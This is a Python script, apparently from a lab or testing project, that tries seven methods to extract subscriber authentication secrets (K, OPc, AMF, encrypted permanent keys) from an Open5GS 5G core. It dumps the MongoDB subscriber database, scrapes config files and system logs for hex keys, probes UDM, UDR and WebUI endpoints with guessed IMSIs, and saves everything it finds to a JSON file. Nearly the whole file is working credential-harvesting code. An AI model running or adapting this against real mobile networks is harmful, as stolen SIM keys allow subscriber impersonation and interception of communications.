#!/usr/bin/env python3
"""
MAXIMUM KEY EXTRACTION
=======================
Every possible method to extract keys from Open5GS

This is the nuclear option - tries EVERYTHING.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
import logging
import socket
import subprocess
import json

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class MaximumExtraction:
    def __init__(self):
        self.keys_found = []
        self.subscribers = []
        self.config_data = {}
        
    def method_1_mongodb_shell(self):
        """Try to access MongoDB directly via mongosh"""
        logger.info("\n[METHOD 1] MongoDB Shell Access")
        logger.info("-" * 50)
        
        import re
        
        try:
            result = subprocess.run(
                ['mongosh', '--quiet', '--eval', 
                 'db = db.getSiblingDB("open5gs"); db.subscribers.find().toArray();'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0 and result.stdout.strip():
                logger.info("✓✓✓ MONGODB ACCESS SUCCESSFUL!")
                data = result.stdout
                
                imsi_matches = re.findall(r"imsi:\s*['\"]([^'\"]+)['\"]", data)
                k_matches = re.findall(r"k:\s*['\"]([0-9A-Fa-f]{32})['\"]", data)
                opc_matches = re.findall(r"opc:\s*['\"]([0-9A-Fa-f]{32})['\"]", data)
                amf_matches = re.findall(r"amf:\s*['\"]([0-9A-Fa-f]{4})['\"]", data)
                
                if imsi_matches:
                    for i, imsi in enumerate(imsi_matches):
                        logger.info(f"\n🔑🔑🔑 SUBSCRIBER {i+1} KEYS EXTRACTED! 🔑🔑🔑")
                        logger.info(f"   IMSI: {imsi}")
                        
                        if i < len(k_matches):
                            k = k_matches[i]
                            logger.info(f"   K:    {k}")
                            self.keys_found.append({"type": "K", "imsi": imsi, "value": k})
                        
                        if i < len(opc_matches):
                            opc = opc_matches[i]
                            logger.info(f"   OPc:  {opc}")
                            self.keys_found.append({"type": "OPc", "imsi": imsi, "value": opc})
                        
                        if i < len(amf_matches):
                            amf = amf_matches[i]
                            logger.info(f"   AMF:  {amf}")
                        
                        self.subscribers.append({"imsi": imsi})
                else:
                    logger.info("  No subscribers found in database")
                
                return True
        except FileNotFoundError:
            logger.info("  mongosh not found, trying mongo...")
        except subprocess.TimeoutExpired:
            logger.info("  MongoDB command timed out")
        except Exception as e:
            logger.info(f"  mongosh error: {e}")
        
        logger.info("  ✗ MongoDB shell not accessible")
        return False
    
    def method_2_read_config_files(self):
        """Read Open5GS configuration files for secrets"""
        logger.info("\n[METHOD 2] Read Configuration Files")
        logger.info("-" * 50)
        
        config_paths = [
            "/etc/open5gs/amf.yaml",
            "/etc/open5gs/ausf.yaml",
            "/etc/open5gs/udm.yaml",
            "/etc/open5gs/udr.yaml",
            "/etc/open5gs/nrf.yaml",
            "/etc/open5gs/smf.yaml",
            "/etc/open5gs/upf.yaml",
            "/etc/open5gs/hss.yaml",
            "/etc/open5gs/mme.yaml",
        ]
        
        for path in config_paths:
            try:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        content = f.read()
                        logger.info(f"✓ Read {path}")
                        self.config_data[path] = content
                        
                        # Look for keys in config
                        if 'key' in content.lower() or 'secret' in content.lower():
                            logger.info(f"  ⚠️ Potential secrets in {path}")
                            
                            # Extract any hex strings that look like keys
                            import re
                            hex_patterns = re.findall(r'[0-9a-fA-F]{32,64}', content)
                            for pattern in hex_patterns:
                                logger.info(f"  🔑 Potential key: {pattern[:32]}...")
                                self.keys_found.append({"type": "config_key", "source": path, "value": pattern})
            except PermissionError:
                logger.info(f"  ✗ Permission denied: {path}")
            except Exception as e:
                logger.debug(f"  Error reading {path}: {e}")
        
        return len(self.config_data) > 0
    
    def method_3_mongodb_python(self, retry=False):
        """Access MongoDB via Python pymongo"""
        logger.info("\n[METHOD 3] MongoDB Python Access")
        logger.info("-" * 50)
        
        try:
            import pymongo
            
            client = pymongo.MongoClient("mongodb://127.0.0.1:27017/", serverSelectionTimeoutMS=3000)
            client.server_info()
            
            logger.info(f"✓ Connected to MongoDB")
            
            db = client["open5gs"]
            
            subscribers = list(db.subscribers.find({}))
            
            if subscribers:
                logger.info(f"✓✓✓ FOUND {len(subscribers)} SUBSCRIBERS!")
                
                for sub in subscribers:
                    logger.info(f"\n🔑 SUBSCRIBER:")
                    imsi = sub.get('imsi', 'Unknown')
                    logger.info(f"   IMSI: {imsi}")
                    
                    if 'security' in sub:
                        sec = sub['security']
                        k = sec.get('k', '')
                        opc = sec.get('opc', '')
                        amf_val = sec.get('amf', '')
                        
                        if k:
                            logger.info(f"   K:   {k}")
                            self.keys_found.append({"type": "K", "imsi": imsi, "value": k})
                        if opc:
                            logger.info(f"   OPc: {opc}")
                            self.keys_found.append({"type": "OPc", "imsi": imsi, "value": opc})
                        if amf_val:
                            logger.info(f"   AMF: {amf_val}")
                    
                    self.subscribers.append(sub)
            else:
                logger.info("  ⚠️ No subscribers in database - nothing to extract!")
                logger.info("  💡 Add a subscriber first with: cli.py add-subscriber")
            
            collections = db.list_collection_names()
            logger.info(f"  Collections: {collections}")
            
            client.close()
            return True
            
        except ImportError:
            if not retry:
                logger.info("  pymongo not installed, skipping...")
            return False
        except Exception as e:
            logger.info(f"  ✗ MongoDB error: {e}")
            return False
    
    def method_4_sbi_http2_curl(self):
        """Use curl to access SBI endpoints with HTTP/2"""
        logger.info("\n[METHOD 4] SBI HTTP/2 Access via curl")
        logger.info("-" * 50)
        
        endpoints = [
            ("127.0.0.10", "/nnrf-nfm/v1/nf-instances", "NRF - List NFs"),
            ("127.0.0.12", "/nudm-sdm/v2/imsi-001010000000001/am-data", "UDM - AM Data"),
            ("127.0.0.12", "/nudm-ueau/v1/supi-imsi-001010000000001/security-information", "UDM - Security Info"),
            ("127.0.0.11", "/nausf-auth/v1/ue-authentications", "AUSF - Auth"),
            ("127.0.0.20", "/nudr-dr/v1/subscription-data/imsi-001010000000001", "UDR - Sub Data"),
        ]
        
        for ip, path, desc in endpoints:
            try:
                result = subprocess.run(
                    ['curl', '-s', '-k', '--http2', f'http://{ip}:7777{path}'],
                    capture_output=True, text=True, timeout=5
                )
                
                if result.returncode == 0 and result.stdout.strip():
                    output = result.stdout
                    logger.info(f"✓ {desc}: {len(output)} bytes")
                    
                    if 'imsi' in output.lower() or 'k' in output.lower() or 'opc' in output.lower():
                        logger.info(f"  ⚠️ Potential key data!")
                        logger.info(f"  Response: {output[:300]}")
                        
                        try:
                            data = json.loads(output)
                            if isinstance(data, list):
                                for item in data:
                                    if 'nfInstanceId' in item:
                                        logger.info(f"  NF Instance: {item.get('nfType', 'Unknown')} - {item.get('nfInstanceId', '')[:20]}...")
                        except:
                            pass
            except subprocess.TimeoutExpired:
                logger.debug(f"  Timeout: {desc}")
            except Exception as e:
                logger.debug(f"  Error {desc}: {e}")
        
        return True
    
    def method_5_direct_udr_query(self):
        """Query UDR directly for subscription data"""
        logger.info("\n[METHOD 5] Direct UDR Query")
        logger.info("-" * 50)
        
        udr_ip = "127.0.0.20"
        
        # UDR stores the actual subscriber data
        imsis_to_try = [
            "001010000000001",
            "001010000000002",
            "001011234567890",
            "208930000000001",
        ]
        
        for imsi in imsis_to_try:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((udr_ip, 7777))
                
                # Try multiple UDR endpoints
                paths = [
                    f"/nudr-dr/v1/subscription-data/imsi-{imsi}/authentication-data/authentication-subscription",
                    f"/nudr-dr/v1/subscription-data/imsi-{imsi}",
                    f"/nudr-dr/v1/subscription-data/imsi-{imsi}/context-data",
                ]
                
                for path in paths:
                    request = f"GET {path} HTTP/1.1\r\nHost: {udr_ip}:7777\r\nAccept: application/json\r\n\r\n"
                    sock.send(request.encode())
                    
                    response = sock.recv(4096)
                    
                    if response and b'200' in response:
                        body = response.split(b'\r\n\r\n', 1)[-1]
                        logger.info(f"✓ UDR response for {imsi}: {len(body)} bytes")
                        
                        if b'authenticationMethod' in body or b'encOpcKey' in body or b'authenticationManagementField' in body:
                            logger.info(f"  🔑🔑🔑 AUTHENTICATION DATA FOUND!")
                            logger.info(f"  Body: {body.decode('utf-8', errors='ignore')[:500]}")
                            
                            try:
                                data = json.loads(body)
                                if 'encOpcKey' in data:
                                    self.keys_found.append({"type": "encOpcKey", "imsi": imsi, "value": data['encOpcKey']})
                                if 'encPermanentKey' in data:
                                    self.keys_found.append({"type": "encPermanentKey", "imsi": imsi, "value": data['encPermanentKey']})
                            except:
                                pass
                
                sock.close()
            except Exception as e:
                logger.debug(f"  UDR query error for {imsi}: {e}")
    
    def method_6_webui_access(self):
        """Try to access Open5GS WebUI"""
        logger.info("\n[METHOD 6] Open5GS WebUI Access")
        logger.info("-" * 50)
        
        webui_ports = [3000, 9999, 5000]
        
        for port in webui_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex(("127.0.0.1", port))
                sock.close()
                
                if result == 0:
                    logger.info(f"✓ WebUI port {port} is OPEN!")
                    
                    # Try to access API
                    try:
                        result = subprocess.run(
                            ['curl', '-s', f'http://127.0.0.1:{port}/api/db/Subscriber'],
                            capture_output=True, text=True, timeout=5
                        )
                        
                        if result.stdout:
                            logger.info(f"  WebUI API response: {result.stdout[:300]}")
                            
                            if 'imsi' in result.stdout.lower():
                                logger.info("  🔑 Subscriber data accessible via WebUI!")
                    except:
                        pass
            except:
                pass
    
    def method_7_journalctl_secrets(self):
        """Check system logs for leaked secrets"""
        logger.info("\n[METHOD 7] System Logs Analysis")
        logger.info("-" * 50)
        
        try:
            result = subprocess.run(
                ['journalctl', '-u', 'open5gs-*', '--since', '1 hour ago', '--no-pager'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.stdout:
                logs = result.stdout
                
                # Look for key patterns
                import re
                
                # Look for hex keys
                key_patterns = re.findall(r'[Kk](?:ey)?[:\s=]+([0-9a-fA-F]{32})', logs)
                for key in key_patterns:
                    logger.info(f"  🔑 Potential key in logs: {key}")
                    self.keys_found.append({"type": "log_key", "value": key})
                
                # Look for IMSIs
                imsi_patterns = re.findall(r'imsi[:\s-]+(\d{15})', logs, re.IGNORECASE)
                for imsi in set(imsi_patterns):
                    logger.info(f"  📱 IMSI in logs: {imsi}")
                
                logger.info(f"  Analyzed {len(logs)} bytes of logs")
        except Exception as e:
            logger.debug(f"  Log analysis error: {e}")
    
    def run_maximum_extraction(self):
        logger.info("")
        logger.info("█" * 60)
        logger.info("█  MAXIMUM KEY EXTRACTION")
        logger.info("█  TRYING EVERYTHING")
        logger.info("█" * 60)
        logger.info("")
        
        # Run all methods
        self.method_1_mongodb_shell()
        self.method_2_read_config_files()
        self.method_3_mongodb_python()
        self.method_4_sbi_http2_curl()
        self.method_5_direct_udr_query()
        self.method_6_webui_access()
        self.method_7_journalctl_secrets()
        
        # Summary
        logger.info("")
        logger.info("█" * 60)
        logger.info("█  EXTRACTION COMPLETE")
        logger.info("█" * 60)
        logger.info("")
        
        if self.keys_found:
            logger.info(f"🔑🔑🔑 FOUND {len(self.keys_found)} KEYS! 🔑🔑🔑")
            for key in self.keys_found:
                logger.info(f"  Type: {key['type']}")
                logger.info(f"  Value: {key['value'][:64]}...")
                if 'imsi' in key:
                    logger.info(f"  IMSI: {key['imsi']}")
                logger.info("")
        else:
            logger.info("No keys extracted")
        
        if self.subscribers:
            logger.info(f"\n📱 Found {len(self.subscribers)} subscribers")
        
        if self.config_data:
            logger.info(f"\n📄 Read {len(self.config_data)} config files")
        
        return {
            "keys_found": self.keys_found,
            "subscribers": self.subscribers,
            "config_files": list(self.config_data.keys())
        }

def run_maximum():
    extractor = MaximumExtraction()
    results = extractor.run_maximum_extraction()
    
    # Save results
    with open("maximum_extraction_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    logger.info(f"\nResults saved to: maximum_extraction_results.json")
    return results

if __name__ == "__main__":
    run_maximum()

